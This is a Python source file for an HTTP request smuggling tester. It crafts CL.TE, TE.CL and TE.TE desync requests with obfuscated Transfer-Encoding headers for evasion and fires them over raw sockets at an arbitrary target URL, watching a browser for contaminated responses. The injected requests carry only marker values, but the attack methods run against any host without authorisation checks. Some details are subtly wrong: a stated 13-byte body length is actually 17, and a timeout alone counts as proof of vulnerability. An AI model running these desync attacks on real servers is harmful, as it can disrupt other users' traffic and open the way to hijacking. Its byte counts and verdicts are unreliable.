#!/usr/bin/env python3
"""
Sabrina HTTP Request Smuggling Tester
=====================================

Implements HTTP Request Smuggling testing using raw sockets with async execution
and browser contamination detection.

Key Features:
- Raw socket implementation (required for malformed headers)
- Async execution using asyncio.to_thread()
- Browser contamination detection (parallel attacks + browser monitoring)
- Bugsy-style result structure
- Multiple attack types (CL.TE, TE.CL, TE.TE)

Author: EGO Revolution Team
Version: 1.0.0
"""

import asyncio
import socket
import ssl
import time
import logging
import uuid
import re
from urllib.parse import urlparse
from typing import Dict, Any, Optional, List, Tuple, Set
from datetime import datetime
from dataclasses import dataclass, field

logger = logging.getLogger(__name__)

# Configuration Constants
SOCKET_TIMEOUT = 5
BUFFER_SIZE = 4096
BROWSER_MONITOR_TIMEOUT = 10  # Seconds to monitor browser after attack
CONFIRMATION_REQUEST_DELAY = 2  # Delay before sending confirmation request

# Attack Types
ATTACK_TYPE_CL_TE = 'cl_te'
ATTACK_TYPE_TE_CL = 'te_cl'
ATTACK_TYPE_TE_TE = 'te_te'


@dataclass
class SmugglingAttackResult:
    """Bugsy-style result structure for smuggling attacks"""
    attack_type: str
    target_url: str
    was_vulnerable: bool
    confidence_score: float
    raw_request: str
    raw_response: str
    response_time: float
    contamination_detected: bool
    browser_affected: bool
    evidence: Dict[str, Any]
    timestamp: str = field(default_factory=lambda: datetime.now().isoformat())


class SabrinaRequestSmugglingTester:
    """
    HTTP Request Smuggling tester using raw sockets with async execution
    and browser contamination detection.
    """
    
    def __init__(self, browser_session=None, navigator=None):
        """
        Initialize the request smuggling tester.
        
        Args:
            browser_session: SabrinaCore browser session for contamination detection
            navigator: UnifiedIntelligentNavigator for navigation (optional)
        """
        self.browser_session = browser_session
        self.navigator = navigator
        self.contamination_markers: Set[str] = set()
        self.browser_responses: List[Dict[str, Any]] = []
        self.monitoring_active = False
        self.baseline_timing: Optional[float] = None  # For timing comparison
        
    def _build_cl_te_desync_request(self, host: str, path: str, marker: str) -> bytes:
        """
        Builds a CL.TE malformed HTTP request.
        
        Frontend (CL) reads Content-Length: 13
        Backend (TE) reads Transfer-Encoding: chunked
        The smuggled payload contains a unique marker for browser detection.
        """
        smuggled_payload = (
            f"GET {path}?sabrina-smuggle-marker={marker} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"X-Smuggle-Test: {marker}\r\n"
            f"X-Contamination-Marker: {marker}\r\n"
            f"\r\n"
        )
        
        # Calculate Content-Length for CL server
        # Body: "7\r\nSMUGGLE\r\n0\r\n\r\n" = 13 bytes
        cl_length = 13
        
        request_template = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Length: {cl_length}\r\n"  # Frontend uses this
            f"Transfer-Encoding: chunked\r\n"   # Backend uses this
            f"Connection: close\r\n"
            f"\r\n"
            f"7\r\n"
            f"SMUGGLE\r\n"
            f"0\r\n"
            f"\r\n"
            f"{smuggled_payload}"
        )
        
        return request_template.encode('utf-8')
    
    def _build_te_cl_desync_request(self, host: str, path: str, marker: str) -> bytes:
        """
        Builds a TE.CL malformed HTTP request.
        
        Frontend (TE) reads Transfer-Encoding: chunked
        Backend (CL) reads Content-Length
        """
        smuggled_payload = (
            f"GET {path}?sabrina-smuggle-marker={marker} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"X-Smuggle-Test: {marker}\r\n"
            f"X-Contamination-Marker: {marker}\r\n"
            f"\r\n"
        )
        
        # TE.CL: Frontend processes chunked, backend uses Content-Length
        request_template = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Transfer-Encoding: chunked\r\n"   # Frontend uses this
            f"Content-Length: {len(smuggled_payload.encode('utf-8'))}\r\n"  # Backend uses this
            f"Connection: close\r\n"
            f"\r\n"
            f"0\r\n"
            f"\r\n"
            f"{smuggled_payload}"
        )
        
        return request_template.encode('utf-8')
    
    def _build_te_te_desync_request(self, host: str, path: str, marker: str, header_mutation: Optional[str] = None) -> bytes:
        """
        Builds a TE.TE malformed HTTP request with header obfuscation.
        
        Both frontend and backend read Transfer-Encoding, but with different
        interpretations due to header obfuscation (spacejoin, underjoin, etc.)
        """
        smuggled_payload = (
            f"GET {path}?sabrina-smuggle-marker={marker} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"X-Smuggle-Test: {marker}\r\n"
            f"X-Contamination-Marker: {marker}\r\n"
            f"\r\n"
        )
        
        # TE.TE: Use obfuscated Transfer-Encoding header
        # Default mutation: spacejoin (Transfer Encoding: instead of Transfer-Encoding:)
        te_header = "Transfer-Encoding:"
        if header_mutation == "spacejoin":
            te_header = "Transfer Encoding:"  # Space instead of hyphen
        elif header_mutation == "underjoin":
            te_header = "Transfer_Encoding:"  # Underscore instead of hyphen
        elif header_mutation == "tabprefix":
            te_header = "Transfer-Encoding:\t"  # Tab after colon
        elif header_mutation == "vertprefix":
            te_header = "Transfer-Encoding:\u000B"  # Vertical tab
        elif header_mutation == "commaCow":
            te_value = "chunked, identity"  # Multiple values
        else:
            te_value = "chunked"
        
        if header_mutation != "commaCow":
            te_value = "chunked"
        
        request_template = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"{te_header} {te_value}\r\n"
            f"Transfer-Encoding: chunked\r\n"  # Second TE header (normal)
            f"Connection: close\r\n"
            f"\r\n"
            f"5c\r\n"  # 92 bytes chunk
            f"0\r\n"
            f"\r\n"
            f"{smuggled_payload}"
        )
        
        return request_template.encode('utf-8')
    
    def _build_request_with_mutation(
        self, 
        attack_type: str, 
        host: str, 
        path: str, 
        marker: str,
        mutation_type: Optional[str] = None
    ) -> bytes:
        """
        Builds a request with header mutations for evasion.
        
        Mutation types from payloads.json:
        - spacejoin: "Transfer Encoding:" (space instead of hyphen)
        - underjoin: "Transfer_Encoding:" (underscore)
        - tabprefix: "Transfer-Encoding:\t" (tab)
        - vertprefix: "Transfer-Encoding:\u000B" (vertical tab)
        - commaCow: "chunked, identity" (multiple values)
        """
        if attack_type == ATTACK_TYPE_CL_TE:
            base_request = self._build_cl_te_desync_request(host, path, marker)
            if mutation_type:
                # Apply header mutation to Transfer-Encoding
                request_str = base_request.decode('utf-8', errors='replace')
                if mutation_type == "spacejoin":
                    request_str = request_str.replace("Transfer-Encoding:", "Transfer Encoding:")
                elif mutation_type == "underjoin":
                    request_str = request_str.replace("Transfer-Encoding:", "Transfer_Encoding:")
                elif mutation_type == "tabprefix":
                    request_str = request_str.replace("Transfer-Encoding: chunked", "Transfer-Encoding:\tchunked")
                return request_str.encode('utf-8')
            return base_request
        elif attack_type == ATTACK_TYPE_TE_CL:
            return self._build_te_cl_desync_request(host, path, marker)
        elif attack_type == ATTACK_TYPE_TE_TE:
            return self._build_te_te_desync_request(host, path, marker, mutation_type)
        else:
            raise ValueError(f"Unknown attack type: {attack_type}")
    
    async def _establish_baseline_timing(self, target_url: str) -> float:
        """
        Establishes baseline response time for comparison.
        Sends a normal request and measures response time.
        """
        parsed = urlparse(target_url)
        host = parsed.hostname
        path = parsed.path or '/'
        
        normal_request = (
            f"GET {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Connection: close\r\n"
            f"\r\n"
        ).encode('utf-8')
        
        success, _, _, response_time = await asyncio.to_thread(
            self._execute_raw_socket_request,
            target_url,
            normal_request
        )
        
        if success:
            self.baseline_timing = response_time
            logger.debug(f"📊 Baseline timing established: {response_time:.3f}s")
        
        return response_time
    
    def _execute_raw_socket_request(
        self, 
        target_url: str, 
        request_bytes: bytes
    ) -> Tuple[bool, str, str, float]:
        """
        Executes a raw socket HTTP request (synchronous).
        This runs in a thread via asyncio.to_thread().
        
        Returns:
            (success, raw_request, raw_response, response_time)
        """
        parsed = urlparse(target_url)
        host = parsed.hostname
        port = parsed.port or (443 if parsed.scheme == 'https' else 80)
        path = parsed.path or '/'
        
        if not host:
            return False, "", "Invalid URL", 0.0
        
        sock = None
        full_response = ""
        start_time = time.time()
        
        try:
            # Create raw TCP socket
            sock = socket.create_connection((host, port), timeout=SOCKET_TIMEOUT)
            
            # Handle SSL/TLS for HTTPS
            if parsed.scheme == 'https':
                context = ssl.create_default_context()
                sock = context.wrap_socket(sock, server_hostname=host)
            
            # Send raw bytes
            sock.sendall(request_bytes)
            
            # Receive response(s)
            # For smuggling, we may receive multiple responses
            sock.settimeout(SOCKET_TIMEOUT)
            response_parts = []
            
            try:
                while True:
                    chunk = sock.recv(BUFFER_SIZE)
                    if not chunk:
                        break
                    response_parts.append(chunk)
                    # If we get a complete HTTP response, check for more
                    # (smuggling may cause multiple responses)
                    if len(response_parts) > 1:
                        # Simple heuristic: if we see two HTTP status lines, we got multiple responses
                        combined = b''.join(response_parts)
                        if combined.count(b'HTTP/1.') >= 2:
                            # Wait a bit more for potential second response
                            try:
                                sock.settimeout(1.0)
                                additional = sock.recv(BUFFER_SIZE)
                                if additional:
                                    response_parts.append(additional)
                            except socket.timeout:
                                pass
                            break
            except socket.timeout:
                # Timeout is actually good - it may indicate smuggling worked
                pass
            
            full_response = b''.join(response_parts).decode('utf-8', errors='replace')
            response_time = time.time() - start_time
            
            return True, request_bytes.decode('utf-8', errors='replace'), full_response, response_time
            
        except Exception as e:
            error_msg = f"Socket error: {str(e)}"
            logger.debug(error_msg)
            response_time = time.time() - start_time
            return False, request_bytes.decode('utf-8', errors='replace'), error_msg, response_time
            
        finally:
            if sock:
                try:
                    sock.close()
                except:
                    pass
    
    async def _monitor_browser_for_contamination(
        self, 
        marker: str, 
        timeout: float = BROWSER_MONITOR_TIMEOUT
    ) -> Tuple[bool, List[Dict[str, Any]]]:
        """
        Monitors the browser for responses containing the contamination marker.
        
        Returns:
            (contamination_detected, captured_responses)
        """
        if not self.browser_session or not self.browser_session.page:
            return False, []
        
        page = self.browser_session.page
        captured_responses = []
        contamination_detected = False
        start_time = time.time()
        
        # Set up response listener
        def handle_response(response):
            try:
                url = response.url
                status = response.status
                headers = response.headers
                
                # Check if marker appears in URL, headers, or response
                marker_found = (
                    marker in url or
                    marker in str(headers) or
                    any(marker in str(v) for v in headers.values())
                )
                
                if marker_found:
                    captured_responses.append({
                        'url': url,
                        'status': status,
                        'headers': dict(headers),
                        'timestamp': time.time() - start_time
                    })
                    logger.warning(f"🚨 CONTAMINATION DETECTED: Marker '{marker}' found in browser response!")
                    nonlocal contamination_detected
                    contamination_detected = True
            except Exception as e:
                logger.debug(f"Error handling browser response: {e}")
        
        # Register listener
        page.on('response', handle_response)
        
        # Monitor for specified timeout
        elapsed = 0
        check_interval = 0.5
        
        while elapsed < timeout:
            await asyncio.sleep(check_interval)
            elapsed += check_interval
            
            # Also check current page content
            try:
                content = await page.content()
                if marker in content:
                    contamination_detected = True
                    captured_responses.append({
                        'url': page.url,
                        'status': 200,
                        'type': 'page_content',
                        'timestamp': elapsed
                    })
            except:
                pass
        
        # Remove listener
        try:
            page.remove_listener('response', handle_response)
        except:
            pass
        
        return contamination_detected, captured_responses
    
    async def _run_te_te_attack(
        self, 
        target_url: str, 
        marker: str,
        mutation_type: Optional[str] = None
    ) -> SmugglingAttackResult:
        """
        Executes a TE.TE smuggling attack with header obfuscation.
        """
        parsed = urlparse(target_url)
        host = parsed.hostname
        path = parsed.path or '/'
        
        if not host:
            raise ValueError(f"Invalid URL: {target_url}")
        
        # Build malformed request with mutation
        request_bytes = self._build_te_te_desync_request(host, path, marker, mutation_type)
        
        # Start browser monitoring
        monitor_task = asyncio.create_task(
            self._monitor_browser_for_contamination(marker, BROWSER_MONITOR_TIMEOUT)
        )
        
        # Execute raw socket request
        _, raw_request, raw_response, response_time = await asyncio.to_thread(
            self._execute_raw_socket_request,
            target_url,
            request_bytes
        )
        
        # Wait for browser monitoring
        contamination_detected, browser_responses = await monitor_task
        
        # Send confirmation request
        await asyncio.sleep(CONFIRMATION_REQUEST_DELAY)
        confirmation_task = asyncio.create_task(
            self._monitor_browser_for_contamination(marker, 5.0)
        )
        
        if self.browser_session and self.browser_session.page:
            try:
                await self.browser_session.page.goto(
                    target_url, 
                    wait_until="domcontentloaded", 
                    timeout=10000
                )
            except:
                pass
        
        confirmation_contamination, confirmation_responses = await confirmation_task
        
        final_contamination = contamination_detected or confirmation_contamination
        all_browser_responses = browser_responses + confirmation_responses
        
        # Analyze response (same as TE.CL)
        multiple_responses = raw_response.count('HTTP/1.') >= 2
        timeout_occurred = response_time >= SOCKET_TIMEOUT * 0.9
        marker_in_response = marker in raw_response
        
        timing_anomaly = False
        if self.baseline_timing:
            timing_diff = abs(response_time - self.baseline_timing)
            timing_anomaly = timing_diff > (self.baseline_timing * 0.5)
        
        import re
        status_matches = re.findall(r'HTTP/1\.\d+\s+(\d+)', raw_response)
        status_codes = [int(s) for s in status_matches if s.isdigit()]
        multiple_status_codes = len(set(status_codes)) > 1
        error_status = any(code >= 400 for code in status_codes)
        
        response_body_anomaly = False
        if raw_response:
            body_start = raw_response.find('\r\n\r\n')
            if body_start > 0:
                body = raw_response[body_start:]
                response_body_anomaly = ('SMUGGLE' in body or marker in body or len(body) > 10000)
        
        was_vulnerable = (
            final_contamination or
            multiple_responses or
            timeout_occurred or
            (timing_anomaly and error_status) or
            (multiple_status_codes and error_status) or
            response_body_anomaly
        )
        
        confidence = 0.0
        if final_contamination:
            confidence = 0.95
        elif multiple_responses:
            confidence = 0.85
        elif multiple_status_codes and error_status:
            confidence = 0.80
        elif timeout_occurred:
            confidence = 0.70
        elif timing_anomaly and error_status:
            confidence = 0.65
        elif marker_in_response:
            confidence = 0.60
        elif response_body_anomaly:
            confidence = 0.55
        
        evidence = {
            'multiple_responses': multiple_responses,
            'timeout_occurred': timeout_occurred,
            'marker_in_response': marker_in_response,
            'timing_anomaly': timing_anomaly,
            'baseline_timing': self.baseline_timing,
            'response_time': response_time,
            'status_codes': status_codes,
            'multiple_status_codes': multiple_status_codes,
            'response_body_anomaly': response_body_anomaly,
            'mutation_type': mutation_type,
            'browser_responses': all_browser_responses
        }
        
        return SmugglingAttackResult(
            attack_type=ATTACK_TYPE_TE_TE,
            target_url=target_url,
            was_vulnerable=was_vulnerable,
            confidence_score=confidence,
            raw_request=raw_request,
            raw_response=raw_response[:5000],
            response_time=response_time,
            contamination_detected=final_contamination,
            browser_affected=final_contamination,
            evidence=evidence,
            timestamp=datetime.now().isoformat()
        )
    
    async def _run_cl_te_attack(
        self, 
        target_url: str, 
        marker: str,
        mutation_type: Optional[str] = None
    ) -> SmugglingAttackResult:
        """
        Executes a CL.TE smuggling attack with browser contamination detection.
        """
        parsed = urlparse(target_url)
        host = parsed.hostname
        path = parsed.path or '/'
        
        if not host:
            raise ValueError(f"Invalid URL: {target_url}")
        
        # Build malformed request (with optional mutation)
        request_bytes = self._build_request_with_mutation(
            ATTACK_TYPE_CL_TE, host, path, marker, mutation_type
        )
        
        # Start browser monitoring BEFORE sending attack
        monitor_task = asyncio.create_task(
            self._monitor_browser_for_contamination(marker, BROWSER_MONITOR_TIMEOUT)
        )
        
        # Execute raw socket request in thread (non-blocking)
        _, raw_request, raw_response, response_time = await asyncio.to_thread(
            self._execute_raw_socket_request,
            target_url,
            request_bytes
        )
        
        # Wait for browser monitoring to complete
        contamination_detected, browser_responses = await monitor_task
        
        # Send confirmation request to trigger smuggled request processing
        await asyncio.sleep(CONFIRMATION_REQUEST_DELAY)
        confirmation_task = asyncio.create_task(
            self._monitor_browser_for_contamination(marker, 5.0)
        )
        
        # Send a normal request that might trigger the smuggled payload
        if self.browser_session and self.browser_session.page:
            try:
                await self.browser_session.page.goto(
                    target_url, 
                    wait_until="domcontentloaded", 
                    timeout=10000
                )
            except:
                pass
        
        confirmation_contamination, confirmation_responses = await confirmation_task
        
        # Combine contamination results
        final_contamination = contamination_detected or confirmation_contamination
        all_browser_responses = browser_responses + confirmation_responses
        
        # Analyze response for smuggling indicators
        multiple_responses = raw_response.count('HTTP/1.') >= 2
        timeout_occurred = response_time >= SOCKET_TIMEOUT * 0.9
        marker_in_response = marker in raw_response
        unusual_status = '404' in raw_response or '400' in raw_response
        
        # Baseline timing comparison (if available)
        timing_anomaly = False
        if self.baseline_timing:
            # Response time significantly different from baseline may indicate smuggling
            timing_diff = abs(response_time - self.baseline_timing)
            timing_anomaly = timing_diff > (self.baseline_timing * 0.5)  # 50% difference
        
        # Status code analysis
        status_codes = []
        status_matches = re.findall(r'HTTP/1\.\d+\s+(\d+)', raw_response)
        status_codes = [int(s) for s in status_matches if s.isdigit()]
        multiple_status_codes = len(set(status_codes)) > 1
        error_status = any(code >= 400 for code in status_codes)
        
        # Response body analysis
        response_body_anomaly = False
        if raw_response:
            # Check for unexpected content in response body
            body_start = raw_response.find('\r\n\r\n')
            if body_start > 0:
                body = raw_response[body_start:]
                # Look for smuggled payload indicators
                response_body_anomaly = (
                    'SMUGGLE' in body or
                    marker in body or
                    len(body) > 10000  # Unusually large response
                )
        
        # Determine vulnerability
        was_vulnerable = (
            final_contamination or  # Browser contamination is strongest indicator
            multiple_responses or   # Multiple HTTP responses
            (timeout_occurred and unusual_status) or  # Timeout + error status
            (timing_anomaly and error_status) or  # Timing anomaly + error
            (multiple_status_codes and error_status) or  # Multiple status codes
            response_body_anomaly  # Response body contains smuggled content
        )
        
        # Calculate confidence with enhanced detection
        confidence = 0.0
        if final_contamination:
            confidence = 0.95  # Browser contamination is very strong evidence
        elif multiple_responses:
            confidence = 0.85
        elif multiple_status_codes and error_status:
            confidence = 0.80
        elif timeout_occurred and unusual_status:
            confidence = 0.70
        elif timing_anomaly and error_status:
            confidence = 0.65
        elif marker_in_response:
            confidence = 0.60
        elif response_body_anomaly:
            confidence = 0.55
        
        evidence = {
            'multiple_responses': multiple_responses,
            'timeout_occurred': timeout_occurred,
            'marker_in_response': marker_in_response,
            'unusual_status': unusual_status,
            'timing_anomaly': timing_anomaly,
            'baseline_timing': self.baseline_timing,
            'response_time': response_time,
            'status_codes': status_codes,
            'multiple_status_codes': multiple_status_codes,
            'response_body_anomaly': response_body_anomaly,
            'browser_responses': all_browser_responses
        }
        
        return SmugglingAttackResult(
            attack_type=ATTACK_TYPE_CL_TE,
            target_url=target_url,
            was_vulnerable=was_vulnerable,
            confidence_score=confidence,
            raw_request=raw_request,
            raw_response=raw_response[:5000],  # Limit response size
            response_time=response_time,
            contamination_detected=final_contamination,
            browser_affected=final_contamination,
            evidence=evidence,
            timestamp=datetime.now().isoformat()
        )
    
    async def _run_te_cl_attack(
        self, 
        target_url: str, 
        marker: str
    ) -> SmugglingAttackResult:
        """
        Executes a TE.CL smuggling attack with browser contamination detection.
        """
        parsed = urlparse(target_url)
        host = parsed.hostname
        path = parsed.path or '/'
        
        if not host:
            raise ValueError(f"Invalid URL: {target_url}")
        
        # Build malformed request
        request_bytes = self._build_te_cl_desync_request(host, path, marker)
        
        # Start browser monitoring
        monitor_task = asyncio.create_task(
            self._monitor_browser_for_contamination(marker, BROWSER_MONITOR_TIMEOUT)
        )
        
        # Execute raw socket request
        _, raw_request, raw_response, response_time = await asyncio.to_thread(
            self._execute_raw_socket_request,
            target_url,
            request_bytes
        )
        
        # Wait for browser monitoring
        contamination_detected, browser_responses = await monitor_task
        
        # Send confirmation request
        await asyncio.sleep(CONFIRMATION_REQUEST_DELAY)
        confirmation_task = asyncio.create_task(
            self._monitor_browser_for_contamination(marker, 5.0)
        )
        
        if self.browser_session and self.browser_session.page:
            try:
                await self.browser_session.page.goto(
                    target_url, 
                    wait_until="domcontentloaded", 
                    timeout=10000
                )
            except:
                pass
        
        confirmation_contamination, confirmation_responses = await confirmation_task
        
        final_contamination = contamination_detected or confirmation_contamination
        all_browser_responses = browser_responses + confirmation_responses
        
        # Analyze response (same enhanced detection as CL.TE)
        multiple_responses = raw_response.count('HTTP/1.') >= 2
        timeout_occurred = response_time >= SOCKET_TIMEOUT * 0.9
        marker_in_response = marker in raw_response
        
        timing_anomaly = False
        if self.baseline_timing:
            timing_diff = abs(response_time - self.baseline_timing)
            timing_anomaly = timing_diff > (self.baseline_timing * 0.5)
        
        import re
        status_matches = re.findall(r'HTTP/1\.\d+\s+(\d+)', raw_response)
        status_codes = [int(s) for s in status_matches if s.isdigit()]
        multiple_status_codes = len(set(status_codes)) > 1
        error_status = any(code >= 400 for code in status_codes)
        
        response_body_anomaly = False
        if raw_response:
            body_start = raw_response.find('\r\n\r\n')
            if body_start > 0:
                body = raw_response[body_start:]
                response_body_anomaly = ('SMUGGLE' in body or marker in body or len(body) > 10000)
        
        was_vulnerable = (
            final_contamination or
            multiple_responses or
            timeout_occurred or
            (timing_anomaly and error_status) or
            (multiple_status_codes and error_status) or
            response_body_anomaly
        )
        
        confidence = 0.0
        if final_contamination:
            confidence = 0.95
        elif multiple_responses:
            confidence = 0.85
        elif multiple_status_codes and error_status:
            confidence = 0.80
        elif timeout_occurred:
            confidence = 0.70
        elif timing_anomaly and error_status:
            confidence = 0.65
        elif marker_in_response:
            confidence = 0.60
        elif response_body_anomaly:
            confidence = 0.55
        
        evidence = {
            'multiple_responses': multiple_responses,
            'timeout_occurred': timeout_occurred,
            'marker_in_response': marker_in_response,
            'timing_anomaly': timing_anomaly,
            'baseline_timing': self.baseline_timing,
            'response_time': response_time,
            'status_codes': status_codes,
            'multiple_status_codes': multiple_status_codes,
            'response_body_anomaly': response_body_anomaly,
            'browser_responses': all_browser_responses
        }
        
        return SmugglingAttackResult(
            attack_type=ATTACK_TYPE_TE_CL,
            target_url=target_url,
            was_vulnerable=was_vulnerable,
            confidence_score=confidence,
            raw_request=raw_request,
            raw_response=raw_response[:5000],
            response_time=response_time,
            contamination_detected=final_contamination,
            browser_affected=final_contamination,
            evidence=evidence,
            timestamp=datetime.now().isoformat()
        )
    
    async def test_request_smuggling(
        self, 
        target_url: str,
        attack_types: Optional[List[str]] = None
    ) -> Dict[str, Any]:
        """
        Main entry point for request smuggling testing.
        
        Args:
            target_url: Target URL to test
            attack_types: List of attack types to try (default: ['cl_te', 'te_cl'])
        
        Returns:
            Dictionary with test results in Bugsy-style format
        """
        if attack_types is None:
            attack_types = [ATTACK_TYPE_CL_TE, ATTACK_TYPE_TE_CL]
        
        logger.info(f"🔍 Starting HTTP Request Smuggling test for {target_url}")
        logger.info(f"   Attack types: {', '.join(attack_types)}")
        
        # Establish baseline timing first
        await self._establish_baseline_timing(target_url)
        
        results = []
        unique_marker = str(uuid.uuid4())[:8]
        
        # Header mutation variations to try (from payloads.json analysis)
        mutation_types = [None, "spacejoin", "underjoin", "tabprefix"]  # Start with most common
        
        # Run attacks in parallel
        tasks = []
        
        if ATTACK_TYPE_CL_TE in attack_types:
            marker_cl_te = f"{unique_marker}-clte"
            # Try base attack first, then mutations if needed
            tasks.append(self._run_cl_te_attack(target_url, marker_cl_te, None))
            # Add mutation variants (limit to avoid too many requests)
            for mutation in mutation_types[1:2]:  # Try spacejoin variant
                tasks.append(self._run_cl_te_attack(target_url, f"{marker_cl_te}-{mutation}", mutation))
        
        if ATTACK_TYPE_TE_CL in attack_types:
            marker_te_cl = f"{unique_marker}-tecl"
            tasks.append(self._run_te_cl_attack(target_url, marker_te_cl))
        
        if ATTACK_TYPE_TE_TE in attack_types:
            marker_te_te = f"{unique_marker}-tete"
            # Try TE.TE with different mutations
            tasks.append(self._run_te_te_attack(target_url, marker_te_te, "spacejoin"))
            tasks.append(self._run_te_te_attack(target_url, f"{marker_te_te}-under", "underjoin"))
        
        # Execute all attacks
        attack_results = await asyncio.gather(*tasks, return_exceptions=True)
        
        # Process results
        for result in attack_results:
            if isinstance(result, Exception):
                logger.error(f"Attack failed: {result}", exc_info=True)
                continue
            
            # Type check to ensure it's a SmugglingAttackResult
            if not isinstance(result, SmugglingAttackResult):
                logger.warning(f"Unexpected result type: {type(result)}")
                continue
            
            results.append({
                'attack_type': result.attack_type,
                'was_vulnerable': result.was_vulnerable,
                'confidence_score': result.confidence_score,
                'raw_request': result.raw_request,
                'raw_response': result.raw_response,
                'response_time': result.response_time,
                'contamination_detected': result.contamination_detected,
                'browser_affected': result.browser_affected,
                'evidence': result.evidence,
                'timestamp': result.timestamp
            })
        
        # Determine overall vulnerability
        vulnerable_results = [r for r in results if r['was_vulnerable']]
        overall_vulnerable = len(vulnerable_results) > 0
        max_confidence = max([r['confidence_score'] for r in results], default=0.0)
        
        logger.info(f"📊 Request Smuggling test completed:")
        logger.info(f"   Vulnerable: {overall_vulnerable}")
        logger.info(f"   Confidence: {max_confidence:.2f}")
        logger.info(f"   Attacks tested: {len(results)}")
        
        return {
            'vulnerable': overall_vulnerable,
            'confidence': max_confidence,
            'results': results,
            'attack_count': len(results),
            'vulnerable_count': len(vulnerable_results)
        }

